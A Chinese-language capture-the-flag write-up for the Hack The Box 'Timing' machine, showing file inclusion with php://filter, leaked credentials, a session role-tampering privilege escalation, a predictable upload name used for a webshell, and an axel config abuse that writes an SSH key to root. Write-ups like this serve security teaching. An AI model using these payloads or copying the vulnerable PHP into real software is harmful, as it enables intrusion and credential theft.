[https://app.hackthebox.com/machines/421](https://app.hackthebox.com/machines/421)

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png)

---

一个登录框,测试了一下貌似不存在sql注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png)

目录爆破结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png)

存在`images/upload`目录,但是没有爆破出有价值的文件

注意到`image.php`没有直接跳转到`login.php`,推测该文件可能可以接受参数去读取`images`文件夹中的文件

`wfuzz -c -w ~/SecTools/SecLists-2021.4/Discovery/Web-Content/burp-parameter-names.txt -u "http://10.10.11.135/image.php?FUZZ=/etc/passwd"`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png)

传入`img=index.php`时,跳转到`login.php`,推测这里为文件包含

`php://filter/read=convert.base64-encode/resource=xxx`

`/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

`image.php`

```php
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}
```

`login.php`

```php
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}

include "db_conn.php";

if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}


if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}
?>
...
```

>注意这里有一个`createTimeChannel`,当用户名正确时后不会直接回显,而是延迟回显类似于延时注入

`db_conn.php`

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

传入`user=admin&password=4_V3Ry_l0000n9_p422w0rd`,成功延迟了一秒钟,但是没有进行跳转,说明存在用户`admin`,但是密码没整出来

在`/etc/passwd`中存在`aaron`用户,尝试登录,也成功延迟了一秒钟,说明存在该用户

测试得知`aaron`作为密码可以登录`aaron`用户

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png)

`profile_update.php`

```php
<?php

include "auth_check.php";

$error = "";

if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}

if (!empty($error)) {
    die("Error updating profile, reason: " . $error);
} else {

    include "db_conn.php";

    $id = $_SESSION['userid'];
    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement->execute(array('id' => $id));
    $user = $statement->fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }


        // dont persist role
        $sql = "UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id";

        $stmt = $pdo->prepare($sql);
        $stmt->execute();

        $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
        $result = $statement->execute(array('id' => $id));
        $user = $statement->fetch();

        // but return it to avoid confusion
        $user['role'] = $role;
        $user['6'] = $role;

        echo json_encode($user, JSON_PRETTY_PRINT);

    } else {
        echo "No user with this id was found.";
    }

}

?>
```

注意到`$_SESSION['role']`可以被篡改

```php
if (isset($_POST['role'])) {
    $role = $_POST['role'];
    $_SESSION['role'] = $role;
}
```

POST传参`firstName=test&lastName=test&email=test&company=test&role=1`可以看到成功越权,得到`admin panel`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png)

`upload.php`

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

注意到文件名是`md5('$file_hash' . time())`而不是`md5("$file_hash" . time())`,因此只需要知道时间戳即可

成功得到图片为`238f241b8f6fe89215ecc1eb02b929db_info.jpg`,利用文件包含即可getshell

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png)

无法直接反弹shell,因此使用正向绑定

`linpeas.sh`显示`-rw-r--r-- 1 root root 627851 Jul 20  2021 /opt/source-files-backup.zip`

压缩包中存在`.git`文件夹

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png)

用`S3cr3t_unGu3ss4bl3_p422w0Rd`尝试登录ssh

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png)

---

[https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md](https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png)

```bash
aaron@timing:/usr/bin$ cat netutils 
#! /bin/bash
java -jar /root/netutils.jar
```

```bash
aaron@timing:~$ sudo netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >>
```

```bash
aaron@timing:~$ nc -lvnp 8000
Listening on [0.0.0.0] (family 0, port 8000)
Connection from 127.0.0.1 53856 received!
GET / HTTP/1.0
Host: 127.0.0.1:8000
Accept: */*
Range: bytes=1-
User-Agent: Axel/2.16.1 (Linux)
```

[https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L69](https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L69)

`default_filename = default`

[http://manpages.ubuntu.com/manpages/trusty/zh_CN/man1/axel.1.html](http://manpages.ubuntu.com/manpages/trusty/zh_CN/man1/axel.1.html)

```
/etc/axelrc 系统全局配置文件

~/.axelrc 个人配置文件

这些文件正文不会在一个手册页内显示，但我希望跟程序一起安装的样本文件包含足够的信息。
配置文件在不同系统的位置可能不一样。
```

修改配置文件`default_filename = /root/.ssh/authorized_keys`

同时把本机的ssh公钥传到靶机上并命名为`index.html`,python3建立一个服务器,将公钥通过`netutils`下载并保存到`/root/.ssh/authorized_keys`中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png)